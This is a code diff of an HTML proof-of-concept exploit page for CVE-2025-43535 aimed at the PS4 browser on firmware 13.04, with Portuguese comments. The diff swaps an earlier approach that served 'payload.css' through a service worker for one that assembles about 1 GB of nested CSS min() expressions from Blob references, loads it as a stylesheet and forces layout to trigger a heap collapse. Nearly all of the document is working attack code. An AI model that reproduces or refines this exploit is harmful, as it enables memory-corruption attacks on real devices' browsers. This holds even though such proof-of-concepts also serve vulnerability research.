@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>CVE-2025-43535 (Remote PoC)</title>
+<title>CVE-2025-43535 — Composite Blob Stream</title>
 <style>
   body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
   #log { background:#111; border:1px solid #88ff88; padding:12px; height:320px; overflow-y:auto; font-size:12px; }
@@ -11,7 +11,7 @@
 </style>
 </head>
 <body>
-<div>CVE-2025-43535 · PS4 FW 13.04 (GitHub Mode)</div>
+<div>CVE-2025-43535 · Composite Stream · PS4 FW 13.04</div>
 <div id="log"></div>
 <div id="stage" style="position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;overflow:hidden"></div>
 
@@ -24,59 +24,93 @@ const L = (m, c) => {
   d.scrollTop = d.scrollHeight;
 };
 
-async function run() {
-  L('Iniciando PoC Remoto via Service Worker...', 'warn');
-
-  if (!('serviceWorker' in navigator)) {
-    L('Erro: Service Worker não suportado ou bloqueado.', 'fail');
-    return;
+// Constrói a matemática base
+function buildDepth(depth) {
+  let e = '1px';
+  for (let d = 1; d <= depth; d++) {
+    e = 'min(' + e + ',' + e + ')';
   }
-
-  try {
-    // 1. Instala o "Servidor Virtual"
-    await navigator.serviceWorker.register('sw.js');
-    L('Service Worker instalado no GitHub Pages.', 'ok');
-
-    // Aguarda o SW assumir o controle (necessário na primeira visita)
-    if (!navigator.serviceWorker.controller) {
-      L('Aguardando controle do SW... A página vai recarregar automaticamente.', 'warn');
-      setTimeout(() => window.location.reload(), 1500);
-      return;
-    }
-
-    L('SW ativo. O JS consumirá quase 0MB de RAM a partir de agora.', 'ok');
-    L('Solicitando 1044MB de CSS diretamente para o C++...', 'warn');
-
-    // 2. Dispara a requisição. O SW vai interceptar 'payload.css'
-    const link = document.createElement('link');
-    link.rel = 'stylesheet';
-    link.href = 'payload.css'; 
-
-    link.onload = () => {
-      L('1044MB Carregados no C++. Disparando Style Resolver...', 'warn');
-      const el = document.createElement('div');
-      el.className = 't';
-      document.getElementById('stage').appendChild(el);
-
-      setTimeout(() => {
-        try {
-          void el.offsetWidth; // O gatilho mortal
-          L('Sobreviveu ao layout. (Não deu crash)', 'ok');
-        } catch(e) { L('Falha no layout: ' + e, 'fail'); }
-      }, 100);
-    };
-
-    link.onerror = () => L('Erro na rede. O SW falhou em gerar o payload.', 'fail');
-
-    L('Aguarde. O PS4 vai processar silenciosamente...', 'info');
-    document.head.appendChild(link);
-
-  } catch (error) {
-    L('Falha Crítica: ' + error, 'fail');
-  }
+  return e;
 }
 
-window.addEventListener('load', run);
+async function run() {
+  L('A Iniciar Tática de Servidor Virtual (Composite Blob)...', 'warn');
+
+  // 1. Gera o bloco C22 (Apenas 36MB de RAM)
+  L('A gerar Bloco Base C22 (~36MB)...', 'info');
+  let c22_str = buildDepth(22);
+  
+  // Converte a string num Blob Real de dados
+  let b22 = new Blob([c22_str], {type: 'text/css'});
+  
+  // 2. Destrói a string no JS para libertar os 36MB
+  L('A limpar a RAM do JavaScript...', 'warn');
+  c22_str = null; 
+  
+  // Esperamos 1.5 segundos para o Garbage Collector do PS4 respirar
+  await new Promise(r => setTimeout(r, 1500)); 
+
+  // 3. Monta o C24 usando APENAS REFERÊNCIAS ao b22 (Custo de RAM = 0MB!)
+  L('A mapear Bloco C24 via ponteiros (Zero RAM consumida)...', 'info');
+  let b24 = new Blob(['min(min(', b22, ',', b22, '),min(', b22, ',', b22, '))'], {type: 'text/css'});
+
+  // 4. Monta a estrutura EXATA de 1044MB do teu PoC usando os ponteiros virtuais
+  L('A construir Ficheiro Virtual de 1044MB (Estrutura Fiel)...', 'info');
+  let finalBlob = new Blob([
+    '.t{width:min(',
+      // Lado Esquerdo: 576MB
+      'min(',
+        'min(', b24, ',', b24, ')',
+        ',',
+        'min(', b24, ',', b24, ')',
+      ')',
+      ',',
+      // Lado Direito: 468MB
+      'min(',
+        'min(', b24, ',', b24, ')',
+        ',',
+        'min(', b24, ',', b22, ')',
+      ')',
+    ')}'
+  ], { type: 'text/css' });
+
+  // Cria a URL que o WebKit consegue puxar como se fosse rede
+  let url = URL.createObjectURL(finalBlob);
+  L('Ficheiro de 1GB alojado na memória virtual.', 'ok');
+
+  await new Promise(r => setTimeout(r, 1000));
+
+  L('A ligar o canal de rede do Parser C++...', 'warn');
+  const link = document.createElement('link');
+  link.rel = 'stylesheet';
+  link.href = url;
+
+  const el = document.createElement('div');
+  el.className = 't';
+  document.getElementById('stage').appendChild(el);
+
+  link.onload = () => {
+    L('Download de 1044MB concluído e parseado pelo C++!', 'ok');
+    L('A forçar o layout para causar o Colapso de Heap...', 'crash');
+    
+    setTimeout(() => {
+      try {
+        void el.offsetWidth; // O GATILHO FINAL
+        L('Sobreviveu. O limite do PS4 pode precisar de mais nós.', 'fail');
+      } catch(e) { 
+        L('Falha: ' + e, 'fail'); 
+      }
+    }, 150);
+  };
+
+  link.onerror = () => {
+    L('Erro crítico na rede local do navegador.', 'fail');
+  };
+
+  document.head.appendChild(link);
+}
+
+window.addEventListener('load', () => setTimeout(run, 500));
 </script>
 </body>
 </html>
